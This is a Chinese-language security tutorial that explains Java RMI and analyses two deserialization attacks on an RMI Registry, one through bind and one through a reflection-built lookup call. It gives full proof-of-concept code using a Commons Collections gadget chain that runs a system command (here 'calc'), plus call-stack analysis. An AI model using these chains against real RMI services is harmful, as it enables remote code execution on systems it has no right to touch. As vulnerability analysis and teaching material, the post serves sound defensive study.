## 概述

RMI(Remote Method Invocation) ：远程方法调用

它使客户机上运行的程序可以通过网络实现调用远程服务器上的对象，要实现`RMI`，客户端和服务端需要共享同一个接口。

## 基础

Client 和 Regisry 基于 Stub 和 Skeleton 进行通信，分别对应 RegistryImpl_Stub 和
RegistryImpl_Skel 两个类。

![image-20221009214413645.png](https://image.3001.net/images/20221013/1665669226_6348186a519e561de20e5.png!small)

### 示例

  1. 一个可以远程调用的接口，实现了 **Remote** 接口

    
    
    package pers.rmi;
    
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    
    //定义一个能够远程调用的接口，并且需要扩展Remote接口
    public interface RemoteInterface extends Remote {
        public String CaseBegin() throws RemoteException;
        public String CaseBegin(Object demo) throws RemoteException;
        public String CaseOver() throws RemoteException;
    }
    

  2. 实现了接口的类

    
    
    package pers.rmi;
    
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    
    //远程可以调用的类，需要继承UnicastRemoteObject类和实现RemoteInterface接口
    
    //也可以指定需要远程调用的类，可以使用UnicastRemoteObject类中的静态方法exportObject指定调用类
    public class RemoteObject extends UnicastRemoteObject implements RemoteInterface {
        protected RemoteObject() throws RemoteException {
            super();
        }
    
        @Override
        public String CaseBegin() {
            return "Hello world!";
        }
    
        @Override
        public String CaseBegin(Object demo) {
            return demo.getClass().getName();
        }
    
        @Override
        public String CaseOver() {
            return "Good bye!";
        }
    }
    

  3. 远程服务端，其中附带了注册中心

    
    
    package pers.rmi;
    
    import java.net.MalformedURLException;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    
    public class RemoteServer {
        public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException {
            LocateRegistry.createRegistry(1099);
            //将需要调用的类进行绑定
            //创建远程类
            RemoteObject remoteObject = new RemoteObject();
            //获取注册中心
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
            //绑定类
            registry.bind("test", remoteObject);
        }
    }
    

  4. 尝试构建一个客户端使用RMI协议

    
    
    package pers.rmi;
    
    import java.net.MalformedURLException;
    import java.rmi.Naming;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    
    public class RMIClient {
        public static void main(String[] args) throws MalformedURLException, NotBoundException, RemoteException {
            RemoteInterface remoteInterface = (RemoteInterface) Naming.lookup("rmi://127.0.0.1:1099/test");
            String s = remoteInterface.CaseBegin();
            System.out.println(s);
        }
    }
    

![image-20221009214133122.png](https://image.3001.net/images/20221013/1665669237_634818758ba0873c005d4.png!small)

能够使用。

## Attacks

### Registry Attacked By Server

Server 端在执行 bind 或者 rebind 方法的时候会将对象以序列化的形式传输给
Registry，导致Registry在反序列化的时候触发漏洞。

例子：

    
    
    // 一个简单的Registry类，通过while死循环不会退出进程
    public class Registry {
        //注册使用的端口
        public static void main(String[] args) throws RemoteException {
            LocateRegistry.createRegistry(1099);
            System.out.println("server start!!");
            while (true);
        }
    }
    
    
    
    // 创建一个Server类，通过bind的调用绑定恶意对象，触发漏洞
    public class RegistryAttackedByServer {
        public static void main(String[] args) throws Exception{
            //仿照ysoserial中的写法，防止在本地调试的时候触发命令
            Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
                    new ConstantTransformer(1),
            };
            Transformer transformerChain = new ChainedTransformer(faketransformers);
            Map innerMap = new HashMap();
            Map outMap = LazyMap.decorate(innerMap, transformerChain);
    
            //实例化
            TiedMapEntry tme = new TiedMapEntry(outMap, "key");
            Map expMap = new HashMap();
            //将其作为key键传入
            expMap.put(tme, "value");
    
            //remove
            outMap.remove("key");
    
            //传入利用链
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
    
            //使用动态代理初始化 AnnotationInvocationHandler
            Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> constructor = c.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
    
            //创建handler
            InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, expMap);
            //使用AnnotationInvocationHandler动态代理Remote
            Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, invocationHandler);
    
            Registry registry = LocateRegistry.getRegistry(1099);
            registry.bind("test", remote);
        }
    }
    

这里是借用的CC链进行反序列化利用，对于CC链不过多的解释，但是我们在前面的基础实例中，提到了，bind绑定的对象，要求必须要实现了`Remote`接口，但是在CC链构造的恶意对象是一个`HashMap`类对象，不满足这个要求。

上面我是们通过动态代理的方式进行封装，根据反序列化的传递性，我们将会调用`HashMap#readObject`方法。

分析一下调用过程。

首先是在`UnicastServerRef#dispatch`方法中进行请求的分发，

![image-20221009222404803.png](https://image.3001.net/images/20221013/1665669249_6348188150ac91bf04550.png!small)

如果`skel`不为空的时候，将会调用`oldDispatch`方法，

![image-20221009222528942.png](https://image.3001.net/images/20221013/1665669255_634818871e482f0467911.png!small)

因为这里是`Registry`端，所以，这里是`RegistryImpl_Skel`类的`dispatch`调用，

![image-20221009222647290.png](https://image.3001.net/images/20221013/1665669271_634818972d2afbca2f91f.png!small)

在这个方法中，将会从远程对象中获取输入流，并调用其`readObject`方法进行反序列化调用。

![image-20221009223041789.png](https://image.3001.net/images/20221013/1665669285_634818a51e82ff9291e7b.png!small)

首先是调用反序列化动态代理类，之后通过传递，触发了封装的`HashMap#readObject`方法。

调用栈

    
    
    readObject:-1, HashMap (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:-1, Method (java.lang.reflect)
    invokeReadObject:-1, ObjectStreamClass (java.io)
    readSerialData:-1, ObjectInputStream (java.io)
    readOrdinaryObject:-1, ObjectInputStream (java.io)
    readObject0:-1, ObjectInputStream (java.io)
    defaultReadFields:-1, ObjectInputStream (java.io)
    defaultReadObject:-1, ObjectInputStream (java.io)
    readObject:-1, AnnotationInvocationHandler (sun.reflect.annotation)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:-1, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:-1, Method (java.lang.reflect)
    invokeReadObject:-1, ObjectStreamClass (java.io)
    readSerialData:-1, ObjectInputStream (java.io)
    readOrdinaryObject:-1, ObjectInputStream (java.io)
    readObject0:-1, ObjectInputStream (java.io)
    defaultReadFields:-1, ObjectInputStream (java.io)
    readSerialData:-1, ObjectInputStream (java.io)
    readOrdinaryObject:-1, ObjectInputStream (java.io)
    readObject0:-1, ObjectInputStream (java.io)
    readObject:-1, ObjectInputStream (java.io)
    dispatch:-1, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:-1, UnicastServerRef (sun.rmi.server)
    dispatch:-1, UnicastServerRef (sun.rmi.server)
    

![image-20221009223807833.png](https://image.3001.net/images/20221013/1665669293_634818ad808c53e8c335a.png!small)

成功利用。

### Registry Attacked By Client

 **一个小知识**

对于`RegistryImpl_Skel#dispatch`方法中进行分发，

通过传入的`var3`变量，使用`switch case`语句进行分发。

![image-20221010194514622.png](https://image.3001.net/images/20221013/1665669315_634818c3c6b002b094e27.png!small)

不同的方法进入不同的case语句

  * bind : 0

  * list : 1

  * lookup : 2

  * rebind : 3

  * unbind : 4

对于Client来说，使用的是Registry的lookup方法

进入case 2语句

![image-20221010194727548.png](https://image.3001.net/images/20221013/1665669323_634818cb065cd13188784.png!small)

这里是能够对传入的对象，进行反序列化的利用，但是不幸的是，因为`lookup`方法传入的是一个String类型的字符，不能够传入一个对象

我们定位到`RegistryImpl_Stub#lookup`方法

![image-20221010195006386.png](https://image.3001.net/images/20221013/1665669328_634818d0b2e7bbd341347.png!small)

在该方法中，对传入的`var1`进行了序列化处理，之后传入前面提到的逻辑进行反序列化处理，这里我们可以不直接使用`lookup`方法进行利用，我们按照lookup中的逻辑，构造类似的代码调用，但是在`writeObject`方法进行序列化的时候，传入一个想要被反序列化的类对象，达到恶意目的。

简单分析一下实现流程。

首先我们需要获取一个`Registry`对象，

    
    
    Registry registry = LocateRegistry.getRegistry(1099);
    

按照上面的lookup方法的写法，调用了`super.ref`属性的newCall方法，我们看看，这个属性的来源，

![image-20221010195846470.png](https://image.3001.net/images/20221013/1665669337_634818d92ed7a82c74656.png!small)

根据这个继承关系图，我们可以清楚的知道`ref`属性的父类`RemoteStub`的父类`RemoteObject`类的属性，是一个`RemoteRef`实例。

我们反射获取这个属性值：

    
    
    Field f1 = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
    f1.setAccessible(true);
    RemoteRef ref = (RemoteRef) f1.get(registry);
    

之后在lookup方法中`ref`属性的`newCall`方法的调用中，传入了一个`operations`属性，跟踪一下该属性的位置。

![image-20221010202304001.png](https://image.3001.net/images/20221013/1665669343_634818df683e20c485253.png!small)

就在这个类中就有

反射获取属性值

    
    
    Field f2 = registry.getClass().getDeclaredField("operations");
    f2.setAccessible(true);
    Operation[] operations = (Operation[]) f2.get(registry);
    

之后就是模拟调用`newCall`方法，lookup方法中第一个参数是`this`关键词，这里我们就传入我们前面获取到`Registry`对象，并序列化我们的`Remote`代理类。

    
    
    RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
    ObjectOutput var3 = var2.getOutputStream();
    var3.writeObject(remote);
    ref.invoke(var2);
    

完整的POC

    
    
    package pers.rmi;
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    
    import java.io.ObjectOutput;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.Operation;
    import java.rmi.server.RemoteCall;
    import java.rmi.server.RemoteObject;
    import java.rmi.server.RemoteRef;
    import java.util.HashMap;
    import java.util.Map;
    
    public class RegistryAttackedByClient {
        public static void main(String[] args) throws Exception{
            //仿照ysoserial中的写法，防止在本地调试的时候触发命令
            Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
                    new ConstantTransformer(1),
            };
            Transformer transformerChain = new ChainedTransformer(faketransformers);
            Map innerMap = new HashMap();
            Map outMap = LazyMap.decorate(innerMap, transformerChain);
    
            //实例化
            TiedMapEntry tme = new TiedMapEntry(outMap, "key");
            Map expMap = new HashMap();
            //将其作为key键传入
            expMap.put(tme, "value");
    
            //remove
            outMap.remove("key");
    
            //传入利用链
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
    
            //使用动态代理初始化 AnnotationInvocationHandler
            Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> constructor = c.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
    
            //创建handler
            InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, expMap);
            //使用AnnotationInvocationHandler动态代理Remote
            Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, invocationHandler);
    
            Registry registry = LocateRegistry.getRegistry(1099);
    
            Field f1 = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
            f1.setAccessible(true);
    //        UnicastRef ref = (UnicastRef) f1.get(registry);
            RemoteRef ref = (RemoteRef) f1.get(registry);
    
            Field f2 = registry.getClass().getDeclaredField("operations");
            f2.setAccessible(true);
            Operation[] operations = (Operation[]) f2.get(registry);
    
            RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
            ObjectOutput var3 = var2.getOutputStream();
            var3.writeObject(remote);
            ref.invoke(var2);
        }
    }
    

同样开启一个死循环的`Registry`注册端，

![image-20221010203358072.png](https://image.3001.net/images/20221013/1665669359_634818efc689cc3939934.png!small)

## 总结

这里分别对攻击Registry的两种方式进行了原理分析，便于理解如何对这类攻击进行反制利用。

## Ref

https://www.anquanke.com/post/id/257452

